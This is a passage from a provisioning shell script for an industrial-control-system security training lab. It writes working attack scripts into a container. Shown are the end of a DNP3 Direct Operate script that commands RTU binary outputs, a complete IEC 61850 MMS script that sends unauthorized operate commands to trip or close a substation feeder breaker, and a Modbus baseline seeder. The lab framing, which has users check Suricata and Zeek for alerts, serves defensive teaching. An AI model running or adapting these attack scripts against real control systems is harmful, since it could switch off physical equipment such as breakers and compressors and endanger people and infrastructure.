            print(f"[dnp3-attack] Response received ({len(resp_header)} bytes) — outstation responded.")
        elif resp_header:
            print(f"[dnp3-attack] Unexpected response: {resp_header.hex(' ')}")
        else:
            print("[dnp3-attack] Server closed connection without responding.")
    except socket.timeout:
        print(f"[dnp3-attack] No DNP3 response within {timeout}s.")
        print("[dnp3-attack] The packet was still delivered — Suricata should have seen it.")

    sock.close()

    print()
    print("[dnp3-attack] ═══════════════════════════════════════════════════════════")
    print("[dnp3-attack]  ATTACK COMPLETE")
    print(f"[dnp3-attack]  Direct Operate (FC 03) sent to {host} outstation {outstation_addr}")
    print(f"[dnp3-attack]  Binary Output {bo_index} commanded → {op}")
    print("[dnp3-attack]  Now check: OTForge Monitor → Suricata tab for the alert.")
    print("[dnp3-attack]             OTForge Monitor → Zeek  tab for the connection log.")
    print("[dnp3-attack] ═══════════════════════════════════════════════════════════")


def main():
    default_ip = os.getenv("RTU_IP", "10.200.10.11")
    parser = argparse.ArgumentParser(
        description="DNP3 Direct Operate attack — ICS Lab 03 (Ironhorse Midstream)"
    )
    parser.add_argument(
        "target", nargs="?", default=default_ip,
        help=f"IP of target RTU/IED (default: {default_ip} = RTU-2 Compressor Stn B)"
    )
    parser.add_argument(
        "--outstation", type=int, default=11,
        help="DNP3 outstation address (default 11 = RTU-2)"
    )
    parser.add_argument(
        "--master", type=int, default=1,
        help="DNP3 master address to use in frames (default 1)"
    )
    parser.add_argument(
        "--port", type=int, default=20000,
        help="TCP port (default 20000)"
    )
    parser.add_argument(
        "--output", type=int, default=0,
        help="Binary Output index to target (default 0)"
    )
    parser.add_argument(
        "--on", action="store_true",
        help="Send LATCH_ON instead of LATCH_OFF (activate output rather than trip)"
    )
    parser.add_argument(
        "--timeout", type=float, default=5.0,
        help="Socket timeout in seconds (default 5)"
    )
    args = parser.parse_args()

    run_attack(
        host=args.target,
        port=args.port,
        outstation_addr=args.outstation,
        master_addr=args.master,
        bo_index=args.output,
        latch_on=args.on,
        timeout=args.timeout,
    )


if __name__ == "__main__":
    main()
PYEOF

chmod +x /root/Desktop/Attack_Scripts/dnp3_attack.py

# ── iec61850_attack.py ──────────────────────────────────────────────────────────
# Lab 04: Unauthorized IEC 61850 MMS control operate against a substation IED.
# Sends the same client Operate service request a legitimate engineering
# workstation would send to trip/close XCBR1 (the feeder breaker) — but from
# an unauthorized network location. The MMS profile served here has no
# built-in authentication (IEC 62351-8/-4 exists but is rarely deployed in the
# field), so any host that can reach TCP 102 can issue this command.
#
# Unlike dnp3_attack.py above, this script does not reimplement the protocol
# in pure Python — MMS is a full ISO stack (ACSE/Presentation/Session on top
# of BER-encoded ASN.1), not a reasonable one-file hand-rolled implementation.
# It shells out to /opt/otforge/iec61850-client, a small C client built
# against libiec61850 (the same library the otforge-iec61850 IED server uses).
cat > /root/Desktop/Attack_Scripts/iec61850_attack.py << 'PYEOF'
#!/usr/bin/env python3
"""
iec61850_attack.py — Unauthorized IEC 61850 MMS control operate against a
substation IED's XCBR1 (feeder breaker).

Usage:
    python3 iec61850_attack.py <ied-ip> [--close]

Examples:
    python3 iec61850_attack.py 10.200.10.12            # trip the breaker (open)
    python3 iec61850_attack.py 10.200.10.12 --close    # re-close the breaker
"""

import argparse
import subprocess
import sys

CLIENT_BIN = "/opt/otforge/iec61850-client"


def main():
    parser = argparse.ArgumentParser(
        description="IEC 61850 MMS control attack against XCBR1.Pos (feeder breaker)"
    )
    parser.add_argument("host", help="IP address of the IEC 61850 IED (MMS server, TCP 102)")
    parser.add_argument("--close", action="store_true",
                        help="Close the breaker instead of opening/tripping it")
    args = parser.parse_args()

    mode = "close" if args.close else "open"
    print(f"[iec61850-attack] Connecting to {args.host}:102 (MMS) ...")
    print(f"[iec61850-attack] Sending unauthorized Operate: XCBR1.Pos -> {mode.upper()}")

    result = subprocess.run([CLIENT_BIN, args.host, mode])
    sys.exit(result.returncode)


if __name__ == "__main__":
    main()
PYEOF

chmod +x /root/Desktop/Attack_Scripts/iec61850_attack.py

echo "[otforge-attack] Attack_Scripts created:"
echo "[otforge-attack]   /root/Desktop/Attack_Scripts/read_coils.py      — read coil + register state (one-shot)"
echo "[otforge-attack]   /root/Desktop/Attack_Scripts/write_coil.py      — coil write attack (--restore to undo)"
echo "[otforge-attack]   /root/Desktop/Attack_Scripts/plc_init.py        — re-seed PLC baseline (inlet pump=ON, outlet valve=OPEN)"
echo "[otforge-attack]   /root/Desktop/Attack_Scripts/monitor_level.py   — live tank-level bar (--fast for 0.5 s poll)"
echo "[otforge-attack]   /root/Desktop/Attack_Scripts/dnp3_attack.py     — DNP3 Direct Operate attack (Lab 03)"
echo "[otforge-attack]   /root/Desktop/Attack_Scripts/iec61850_attack.py — IEC 61850 MMS breaker control attack (Lab 04)"

# ── PLC Modbus baseline initialization ────────────────────────────────────────
# Runs in the background so VNC/noVNC startup is not delayed.
# Polls PLC_IP:PLC_PORT every 2 s for up to 60 s, then writes the baseline
# state once the PLC's Modbus listener is accepting connections.
# This is necessary because OpenPLC zeros all AT-mapped I/O at container start,
# overriding any initial values in the ST program.
# 60 s window covers ARM64 (Mac Apple Silicon) where OpenPLC startup is slower
# than on x86-64 Windows even with a native ARM64 image.
(
    _PLC_IP="${PLC_IP:-10.200.10.10}"
    _PLC_PORT="${PLC_PORT:-502}"
    echo "[otforge-attack] [plc-init] Waiting for PLC at ${_PLC_IP}:${_PLC_PORT}..."
    for i in $(seq 1 30); do
        if nc -z -w1 "${_PLC_IP}" "${_PLC_PORT}" 2>/dev/null; then
            echo "[otforge-attack] [plc-init] PLC reachable (attempt ${i}) — seeding baseline..."
            python3 /root/Desktop/Attack_Scripts/plc_init.py
            exit $?
        fi
        echo "[otforge-attack] [plc-init] Not reachable yet (attempt ${i}/30) — waiting 2 s..."
        sleep 2
    done
    echo "[otforge-attack] [plc-init] PLC did not become reachable within 60 s — skipping baseline seed."
    exit 1
) &

# ── Keep container alive ──────────────────────────────────────────────────────
# The Electron xterm.js terminal attaches via `docker exec -i <name> /bin/bash`.
# The process here just holds the container open; exec sessions are independent.
exec tail -f /dev/null
